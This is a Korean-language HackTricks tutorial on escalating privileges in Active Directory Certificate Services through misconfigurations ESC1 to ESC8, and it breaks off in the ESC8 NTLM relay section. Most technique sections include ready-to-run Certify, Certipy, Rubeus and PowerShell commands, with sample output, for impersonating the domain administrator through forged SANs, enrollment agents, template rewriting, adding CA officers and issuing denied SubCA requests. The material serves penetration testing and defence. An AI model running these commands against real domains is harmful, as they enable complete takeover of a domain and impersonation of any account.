# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**다음은 게시물의 escalation technique 섹션을 요약한 것입니다:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 Certificate Templates - ESC1

### 설명

### 잘못 구성된 Certificate Templates - ESC1 설명

- **Enterprise CA가 낮은 권한의 사용자에게 Enrolment 권한을 부여합니다.**
- **Manager 승인이 필요하지 않습니다.**
- **권한 있는 담당자의 서명이 필요하지 않습니다.**
- **Certificate Templates의 Security Descriptor가 지나치게 허용적으로 설정되어 있어 낮은 권한의 사용자가 Enrolment 권한을 얻을 수 있습니다.**
- **Certificate Templates가 authentication을 가능하게 하는 EKU를 정의하도록 구성되어 있습니다:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) 또는 EKU가 없음(SubCA)과 같은 Extended Key Usage (EKU) 식별자가 포함됩니다.
- **Certificate Signing Request (CSR)에 subjectAltName을 포함할 수 있는 권한이 템플릿에 의해 허용됩니다:**
- Active Directory (AD)는 인증서에 subjectAltName (SAN)이 있는 경우 identity verification에서 이를 우선합니다. 즉, CSR에 SAN을 지정하면 모든 사용자(예: domain administrator)를 impersonate하는 인증서를 요청할 수 있습니다. 요청자가 SAN을 지정할 수 있는지는 Certificate Template의 AD object에서 `mspki-certificate-name-flag` property를 통해 확인할 수 있습니다. 이 property는 bitmask이며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag가 있으면 요청자가 SAN을 지정할 수 있습니다.

> [!CAUTION]
> 위 구성에서는 낮은 권한의 사용자가 원하는 SAN을 사용해 인증서를 요청할 수 있으므로 Kerberos 또는 SChannel을 통해 모든 domain principal로 authentication할 수 있습니다.

이 기능은 제품이나 deployment service가 on-the-fly 방식으로 HTTPS 또는 host certificate를 생성할 수 있도록 지원하기 위해, 또는 이에 대한 이해 부족으로 인해 활성화되는 경우가 있습니다.

이 옵션을 사용해 certificate를 생성하면 warning이 표시됩니다. 하지만 기존 Certificate Template(예: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`가 활성화된 `WebServer` template)을 duplicate한 다음 authentication OID를 포함하도록 수정하는 경우에는 warning이 표시되지 않습니다.<sup>[[6]](#references)</sup>

### Abuse

**vulnerable certificate template을 찾으려면** 다음을 실행할 수 있습니다:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**이 취약점을 악용해 관리자를 사칭하려면** 다음을 실행할 수 있다:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
그런 다음 생성된 **certificate를 `.pfx`** 형식으로 변환하여 다시 **Rubeus 또는 certipy를 사용해 authenticate**할 수 있습니다:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 바이너리인 "Certreq.exe" 및 "Certutil.exe"를 사용하여 PFX를 생성할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest의 configuration schema 내에서 인증서 템플릿을 열거할 수 있습니다. 특히 승인이 필요하지 않거나 서명이 필요하지 않고, Client Authentication 또는 Smart Card Logon EKU를 보유하며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 템플릿은 다음 LDAP query를 실행하여 열거할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

두 번째 abuse 시나리오는 첫 번째 시나리오의 변형입니다.

1. Enterprise CA에서 권한이 낮은 사용자에게 enrollment 권한이 부여됩니다.
2. manager approval 요구 사항이 비활성화됩니다.
3. authorized signatures 필요 조건이 생략됩니다.
4. 인증서 템플릿의 지나치게 허용적인 security descriptor가 권한이 낮은 사용자에게 certificate enrollment 권한을 부여합니다.
5. **인증서 템플릿에 Any Purpose EKU가 포함되도록 정의되었거나 EKU가 없습니다.**

**Any Purpose EKU**를 사용하면 공격자가 client authentication, server authentication, code signing 등을 포함한 **모든 목적**으로 인증서를 획득할 수 있습니다. 이 시나리오를 악용하기 위해 **ESC3에 사용된 것과 동일한 technique**을 사용할 수 있습니다.

**EKU가 없는** 인증서는 subordinate CA 인증서로 동작하며, **모든 목적**으로 악용될 수 있고 **새 인증서에 서명하는 데에도 사용**할 수 있습니다. 따라서 공격자는 subordinate CA 인증서를 활용하여 새 인증서에 임의의 EKU 또는 필드를 지정할 수 있습니다.

그러나 subordinate CA가 기본 설정인 **`NTAuthCertificates`** 객체에서 신뢰되지 않는 경우, **domain authentication**을 위해 생성된 새 인증서는 작동하지 않습니다. 그럼에도 공격자는 **모든 EKU**와 임의의 인증서 값을 가진 **새 인증서**를 생성할 수 있습니다. 이러한 인증서는 다양한 목적(예: code signing, server authentication 등)에 **악용**될 가능성이 있으며, SAML, AD FS 또는 IPSec와 같은 네트워크의 다른 애플리케이션에도 중대한 영향을 미칠 수 있습니다.<sup>[[6]](#references)</sup>

AD Forest의 configuration schema에서 이 시나리오에 해당하는 템플릿을 열거하려면 다음 LDAP query를 실행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 잘못 구성된 Enrolment Agent Templates - ESC3

### 설명

이 시나리오는 첫 번째 및 두 번째 시나리오와 유사하지만 **다른 EKU**(Certificate Request Agent)와 **서로 다른 2개의 템플릿**을 **악용**합니다(따라서 요구 사항도 2가지 세트가 있음).

**Certificate Request Agent EKU**(OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **Enrollment Agent**로 알려져 있으며, 주체가 **다른 사용자를 대신하여** **인증서**를 **등록**할 수 있도록 합니다.

**“enrollment agent”**는 이러한 **템플릿**에 등록한 뒤, 그 결과로 생성된 **인증서를 사용하여 다른 사용자를 대신해 CSR에 공동 서명**합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **전송**하여 **“enroll on behalf of”를 허용하는** **템플릿**에 등록하고, CA는 **“other” 사용자에 속한 인증서**로 응답합니다.<sup>[[6]](#references)</sup>

**요구 사항 1:**

- Enterprise CA가 낮은 권한의 사용자에게 enrollment 권한을 부여합니다.
- 관리자 승인이 필요하지 않습니다.
- 권한 있는 서명이 필요하지 않습니다.
- 인증서 템플릿의 보안 설명자가 지나치게 허용적으로 설정되어 낮은 권한의 사용자에게 enrollment 권한을 부여합니다.
- 인증서 템플릿에 Certificate Request Agent EKU가 포함되어 있어 다른 주체를 대신하여 다른 인증서 템플릿을 요청할 수 있습니다.

**요구 사항 2:**

- Enterprise CA가 낮은 권한의 사용자에게 enrollment 권한을 부여합니다.
- 관리자 승인을 우회할 수 있습니다.
- 템플릿의 스키마 버전이 1이거나 2보다 크고, Certificate Request Agent EKU를 요구하는 Application Policy Issuance Requirement를 지정합니다.
- 인증서 템플릿에 정의된 EKU가 domain authentication을 허용합니다.
- CA에 enrollment agent 제한이 적용되지 않습니다.

### 악용

다음 도구를 사용하여 이 시나리오를 악용할 수 있습니다: [**Certify**](https://github.com/GhostPack/Certify) 또는 [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**등록 에이전트 인증서를** **획득할 수 있는 사용자**, 등록 **에이전트**가 등록할 수 있는 템플릿, 그리고 등록 에이전트가 대신하여 작업할 수 있는 **계정**은 엔터프라이즈 CA에 의해 제한될 수 있습니다. 이는 `certsrc.msc` **스냅인**을 열고, **CA를 마우스 오른쪽 버튼으로 클릭한 다음**, **속성**을 클릭하고, “등록 에이전트” 탭으로 **이동**하여 설정할 수 있습니다.

그러나 CA의 **기본** 설정은 “**등록 에이전트를 제한하지 않음**”이라는 점에 유의해야 합니다. 관리자가 등록 에이전트 제한을 활성화하여 “등록 에이전트 제한”으로 설정하더라도, 기본 구성은 여전히 매우 permissive합니다. 이 구성에서는 **Everyone**이 모든 템플릿에 누구든 대신하여 등록할 수 있습니다.

### Windows 전용 PowerShell PoC와 Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai)는 Certify 또는 Certipy 없이 ESC1 및 ESC2/ESC3를 실행합니다. 해당 스크립트는 `X509Enrollment` COM API를 사용하여 exportable 2048-bit RSA key를 생성하고, PKCS#10 request를 구성하며, LDAP를 통해 첫 번째 `pKIEnrollmentService`를 검색하고, `CertificateAuthority.Request`를 통해 제출한 다음, 응답을 `Cert:\CurrentUser\My`에 설치하고, Base64-encoded PFX로 export합니다. ESC1 스크립트는 공격자가 선택한 UPN SAN(`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, value `0xb`)을 추가하는 반면, ESC2/ESC3 스크립트는 첫 번째 인증서를 사용하여 on-behalf-of request에 서명하는 PKCS#7을 생성합니다.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
스크립트는 Rubeus에서 직접 사용할 수 있도록 private key가 포함된 **PFX**의 Base64를 출력합니다. `[Convert]::ToBase64String($cert.RawData)`로 대체하지 마세요. `RawData`는 public certificate만 인코딩하므로 PKINIT request에 서명할 수 없습니다.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Vulnerable Certificate Template Access Control - ESC4

### **설명**

**certificate templates**의 **security descriptor**는 특정 **AD principals**가 해당 template에 대해 보유하는 **permissions**을 정의합니다.

**attacker**가 **template**을 **alter**하고 **이전 섹션**에서 설명한 **exploitable misconfigurations**를 적용하는 데 필요한 **permissions**을 보유하고 있다면, privilege escalation이 가능할 수 있습니다.

**certificate templates**에 적용되는 주요 permissions은 다음과 같습니다:<sup>[[6]](#references)</sup>

- **Owner:** 객체에 대한 암묵적인 제어 권한을 부여하며, 모든 attributes를 수정할 수 있습니다.
- **FullControl:** 모든 attributes를 수정하는 기능을 포함하여 객체에 대한 완전한 권한을 부여합니다.
- **WriteOwner:** 객체의 owner를 attacker가 제어하는 principal로 변경할 수 있습니다.
- **WriteDacl:** access controls를 조정하여 attacker에게 FullControl을 부여할 수 있습니다.
- **WriteProperty:** 모든 object properties를 편집할 수 있습니다.

### Abuse

templates 및 기타 PKI objects에 대한 edit rights를 가진 principals를 식별하려면 Certify로 enumerate합니다:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
이전 예시와 같은 privesc의 예시입니다:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4는 사용자가 certificate template에 대한 write privileges를 보유한 경우입니다. 예를 들어 certificate template의 configuration을 덮어써 template을 ESC1에 취약하게 만드는 데 악용할 수 있습니다.

위의 경로에서 볼 수 있듯이 이러한 privileges를 가진 계정은 `JOHNPC`뿐이지만, 우리 사용자 `JOHN`은 `JOHNPC`에 대한 새로운 `AddKeyCredentialLink` edge를 보유하고 있습니다. 이 technique은 certificates와 관련되어 있으므로, [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려진 이 attack도 구현했습니다.<sup>[[8]](#references)</sup> 다음은 피해자의 NT hash를 가져오기 위한 Certipy의 `shadow auto` command를 살펴보는 간단한 예시입니다.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**는 단일 명령으로 certificate template의 configuration을 덮어쓸 수 있습니다. **기본적으로**, Certipy는 configuration을 **ESC1에 취약하도록** 덮어씁니다. 또한 **`-save-old` parameter를 지정하여 기존 configuration을 저장**할 수 있으며, 이는 attack 후 configuration을 **복원**하는 데 유용합니다.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 취약한 PKI 객체 Access Control - ESC5

### 설명

Certificate Templates와 Certification Authority 외에도 여러 객체를 포함하는 광범위한 ACL 기반 관계망은 전체 AD CS 시스템의 보안에 영향을 줄 수 있습니다. 보안에 중대한 영향을 미칠 수 있는 이러한 객체에는 다음이 포함됩니다.

- S4U2Self 또는 S4U2Proxy와 같은 메커니즘을 통해 침해될 수 있는 CA server의 AD computer object
- CA server의 RPC/DCOM server
- 특정 container 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 descendant AD object 또는 container. 이 경로에는 Certificate Templates container, Certification Authorities container, NTAuthCertificates object, Enrollment Services Container와 같은 container 및 object가 포함되며, 이에 국한되지 않습니다.

low-privileged attacker가 이러한 핵심 구성 요소 중 하나를 control할 수 있다면 PKI 시스템의 보안이 침해될 수 있습니다.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)에서 다루는 주제는 Microsoft가 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag의 영향을 함께 다룹니다. Certification Authority (CA)에서 이 configuration을 활성화하면 Active Directory®에서 생성된 request를 포함하여 **모든 request**의 **subject alternative name**에 **user-defined values**를 포함할 수 있습니다. 따라서 이 설정을 통해 **intruder**는 domain **authentication**에 사용되도록 구성된 **모든 template**을 사용하여 enroll할 수 있습니다. 여기에는 표준 User template처럼 **unprivileged** user의 enrollment를 허용하는 template이 포함됩니다. 그 결과 certificate를 확보하여 intruder가 domain administrator 또는 domain 내의 **다른 모든 active entity**로 authenticate할 수 있습니다.<sup>[[9]](#references)</sup>

**참고**: `certreq.exe`의 `-attrib "SAN:"` argument를 통해 Certificate Signing Request (CSR)에 **alternative names**를 추가하는 방식은 ESC1에서 SAN을 exploitation하는 전략과 **차이**가 있습니다. 여기서 차이점은 **account information이 캡슐화되는 방식**에 있습니다. 즉, extension이 아니라 certificate attribute 내에 포함됩니다.

### Abuse

설정이 활성화되어 있는지 확인하려면 다음 `certutil.exe` command를 사용할 수 있습니다.
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
이 작업은 본질적으로 **remote registry access**를 사용하므로, 대안적인 접근 방식은 다음과 같을 수 있습니다:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) 및 [**Certipy**](https://github.com/ly4k/Certipy)와 같은 도구는 이 잘못된 구성을 탐지하고 악용할 수 있습니다:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
이러한 설정을 변경하려면 **도메인 관리자** 권한 또는 이에 상응하는 권한이 있다고 가정할 때, 다음 명령을 어느 워크스테이션에서든 실행할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
환경에서 이 구성을 비활성화하려면 다음과 같이 플래그를 제거할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022년 5월 보안 업데이트 이후 새로 발급되는 **certificates**에는 **requester의 `objectSid` 속성**을 포함하는 **security extension**이 추가됩니다. ESC1의 경우 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우 SID는 SAN이 아니라 **requester의 `objectSid`**를 반영합니다.\
> ESC6을 exploit하려면 **SAN을 새로운 security extension보다 우선하는** ESC10 (Weak Certificate Mappings)에 시스템이 취약해야 합니다.

## 취약한 Certificate Authority Access Control - ESC7

### Attack 1

#### 설명

Certificate authority에 대한 access control은 CA 작업을 제어하는 일련의 권한을 통해 유지됩니다. 이러한 권한은 `certsrv.msc`에 접속하고, CA를 마우스 오른쪽 버튼으로 클릭한 다음, 속성을 선택하고 Security 탭으로 이동하여 확인할 수 있습니다. 또한 다음과 같은 명령을 사용하여 PSPKI module로 권한을 열거할 수 있습니다:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
이는 각각 “CA administrator” 및 “Certificate Manager” 역할에 해당하는 주요 권한인 **`ManageCA`** 및 **`ManageCertificates`**에 대한 정보를 제공합니다.<sup>[[6]](#references)</sup>

#### 악용

인증 기관에 대한 **`ManageCA`** 권한이 있으면 주체가 PSPKI를 사용하여 원격으로 설정을 조작할 수 있습니다. 여기에는 모든 template에서 SAN 지정을 허용하도록 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag를 전환하는 작업이 포함되며, 이는 domain escalation의 핵심 요소입니다.

PSPKI의 **Enable-PolicyModuleFlag** cmdlet을 사용하면 이 과정을 간소화할 수 있으며, 직접 GUI와 상호 작용하지 않고도 수정할 수 있습니다.

**`ManageCertificates`** 권한을 보유하면 pending request를 승인할 수 있어 “CA certificate manager approval” 보호 기능을 사실상 우회할 수 있습니다.

**Certify** 및 **PSPKI** module을 함께 사용하여 certificate를 request하고, 승인하고, download할 수 있습니다:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 공격 2

#### 설명

> [!WARNING]
> **이전 공격**에서는 **`Manage CA`** 권한을 사용하여 **EDITF_ATTRIBUTESUBJECTALTNAME2** 플래그를 **활성화**하고 **ESC6 공격**을 수행했지만, CA 서비스(`CertSvc`)가 다시 시작될 때까지는 아무런 효과가 없습니다. 사용자에게 **`Manage CA`** 액세스 권한이 있으면 해당 사용자는 **서비스를 다시 시작**할 수도 있습니다. 하지만 이것이 **원격으로 서비스를 다시 시작할 수 있음**을 의미하지는 않습니다. 또한 2022년 5월 보안 업데이트로 인해 대부분의 패치된 환경에서는 E**SC6가 기본적으로 작동하지 않을 수 있습니다**.

따라서 여기서는 다른 공격을 소개합니다.

사전 요구 사항:

- **`ManageCA` 권한**만 필요
- **`Manage Certificates`** 권한 (`ManageCA`에서 부여 가능)
- 인증서 템플릿 **`SubCA`**가 **활성화**되어 있어야 함 (`ManageCA`에서 활성화 가능)

이 기법은 `Manage CA` 및 _`Manage Certificates`_ 액세스 권한이 있는 사용자가 **실패한 인증서 요청을 발급할 수 있다**는 사실에 기반합니다. **`SubCA`** 인증서 템플릿은 **ESC1에 취약**하지만, **관리자만** 해당 템플릿에 등록할 수 있습니다. 따라서 **사용자**는 **`SubCA`** 등록을 **요청**할 수 있으며, 이 요청은 **거부**되지만 이후 관리자가 발급할 수 있습니다.<sup>[[6]](#references)</sup>

#### 악용

자신의 사용자를 새로운 담당자로 추가하여 **`Manage Certificates`** 액세스 권한을 **스스로 부여**할 수 있습니다.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template은 `-enable-template` parameter를 사용하여 **CA에서 활성화**할 수 있습니다. 기본적으로 `SubCA` template은 활성화되어 있습니다.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
이 공격의 사전 요구 사항을 충족했다면 **`SubCA` 템플릿을 기반으로 인증서를 요청**하는 것부터 시작할 수 있습니다.

**이 요청은 거부되**지만, 개인 키를 저장하고 요청 ID를 기록해 둡니다.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` 및 `Manage Certificates`** 권한이 있으면 `ca` 명령과 `-issue-request <request ID>` 매개 변수를 사용해 **실패한 인증서 요청을 발급**할 수 있습니다.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
마지막으로 `req` 명령과 `-retrieve <request ID>` 매개변수를 사용하여 **발급된 인증서를 가져올 수 있습니다**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 설명

기존 ESC7 abuse(EDITF attributes 활성화 또는 pending requests 승인) 외에도, **Certify 2.0**은 Enterprise CA에서 *Manage Certificates* (일명 **Certificate Manager / Officer**) role만 필요로 하는 완전히 새로운 primitive을 공개했습니다.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method는 *Manage Certificates*를 보유한 모든 principal이 실행할 수 있습니다. 이 method는 전통적으로 legitimate CA가 **pending** requests의 extensions를 업데이트하는 데 사용되었지만, attacker는 이를 abuse하여 승인을 기다리는 request에 **non-default certificate extension**(예: `1.1.1.1`과 같은 custom *Certificate Issuance Policy* OID)을 **추가**할 수 있습니다.

대상 template이 해당 extension의 default value를 정의하지 않는 경우, request가 최종적으로 발급될 때 CA는 attacker가 제어하는 value를 **overwrite하지 않습니다**. 따라서 결과 certificate에는 attacker가 선택한 extension이 포함되며, 다음과 같은 방식으로 사용될 수 있습니다.

* 다른 vulnerable templates의 Application / Issuance Policy requirements를 충족하여 privilege escalation으로 이어짐
* third-party systems에서 certificate에 예상치 못한 trust를 부여하는 추가 EKUs 또는 policies 주입

요약하면, 이전에는 ESC7의 “덜 강력한” 절반으로 간주되던 *Manage Certificates*를 이제 CA configuration을 변경하거나 더 제한적인 *Manage CA* right를 요구하지 않고도 full privilege escalation 또는 장기적인 persistence에 활용할 수 있습니다.

#### Certify 2.0을 사용한 primitive abuse

1. **계속 *pending* 상태로 남을 certificate request를 제출합니다.** manager approval이 필요한 template을 사용하면 이를 강제할 수 있습니다.
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# 반환된 Request ID를 기록합니다
```

2. 새로운 `manage-ca` command를 사용하여 **pending request에 custom extension을 추가합니다**.
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*template이 이미 *Certificate Issuance Policies* extension을 정의하고 있지 않다면, 위 value는 발급 후에도 보존됩니다.*

3. (role에 *Manage Certificates* approval rights도 있는 경우) **request를 발급**하거나 operator가 승인할 때까지 기다립니다. 발급되면 certificate를 다운로드합니다.
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 이제 결과 certificate에는 malicious issuance-policy OID가 포함되며, 후속 attacks(예: ESC13, domain escalation 등)에 사용할 수 있습니다.

> 참고: 동일한 attack은 `ca` command와 `-set-extension` parameter를 통해 Certipy ≥ 4.7에서도 실행할 수 있습니다.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 설명

> [!TIP]
> **AD CS가 설치된** environments에서 **vulnerable한 web enrollment endpoint**가 존재하고, **domain computer enrollment 및 client authentication을 허용하는 certificate template**(예: default **`Machine`** template)이 하나 이상 published되어 있다면, **spooler service가 active인 모든 computer가 attacker에 의해 compromise될 수 있습니다**!

AD CS는 여러 **HTTP-based enrollment methods**를 지원하며, administrators가 설치할 수 있는 추가 server roles를 통해 제공됩니다. HTTP-based certificate enrollment를 위한 이러한 interfaces는 **NTLM relay attacks**에 취약합니다. attacker는 **compromised machine에서 inbound NTLM을 통해 authenticate하는 모든 AD account를 impersonate할 수 있습니다**. victim account를 impersonate하는 동안 attacker는 이러한 web interfaces에 access하여 `User` 또는 `Machine` certificate templates를 사용한 **client authentication certificate를 request**할 수 있습니다.

- **web enrollment interface**(구형 ASP application이며 `http://<caserver>/certsrv/`에서 사용 가능)는 기본적으로 HTTP만 사용하므로 NTLM relay attacks에 대한 protection을 제공하지 않습니다. 또한 Authorization HTTP header를 통한 NTLM authentication만 명시적으로 허용하므로 Kerberos와 같은 더 secure한 authentication methods는 적용할 수 없습니다.
- **Certificate Enrollment Service**(CES), **Certificate Enrollment Policy**(CEP) Web Service 및 **Network Device Enrollment Service**(NDES)는 기본적으로 Authorization HTTP header를 통한 negotiate authentication을 지원합니다. Negotiate authentication은 **Kerberos와 **NTLM을 모두 지원하므로, attacker는 relay attacks 중 authentication을 **NTLM으로 downgrade**할 수 있습니다. 이러한 web services는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 **NTLM relay attacks를 방어할 수 없습니다**. HTTPS services에 대한 NTLM relay attacks protection은 HTTPS가 channel binding과 결합된 경우에만 가능합니다. 안타깝게도 AD CS는 channel binding에 필요한 Extended Protection for Authentication을 IIS에서 활성화하지 않습니다.<sup>[[6]](#references)</sup>

NTLM relay attacks의 일반적인 **문제**는 **NTLM sessions의 짧은 duration**과 **NTLM signing을 요구하는 services와 상호작용할 수 없다는 점**입니다.

